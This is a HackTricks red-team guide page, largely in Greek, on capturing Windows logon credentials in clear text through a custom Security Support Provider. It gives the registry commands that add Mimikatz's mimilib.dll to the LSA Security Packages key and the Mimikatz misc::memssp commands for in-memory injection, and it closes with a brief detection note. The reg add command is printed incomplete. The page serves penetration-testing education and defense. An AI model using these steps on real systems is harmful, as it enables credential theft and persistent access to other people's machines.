# Custom SSP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράψετε** σε **καθαρό κείμενο** τα **διαπιστευτήρια** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.

#### Mimilib

Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
Αφήστε το dll στο `C:\Windows\System32\`\
Πάρτε μια λίστα με τα υπάρχοντα LSA Security Packages:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Προσθέστε το `mimilib.dll` στη λίστα Παρόχων Υποστήριξης Ασφαλείας (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`

#### Στη μνήμη

You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
```powershell
privilege::debug
misc::memssp
```
Αυτό δεν θα επιβιώσει σε επανεκκινήσεις.

#### Μετριασμός

Event ID 4657 - Έλεγχος δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
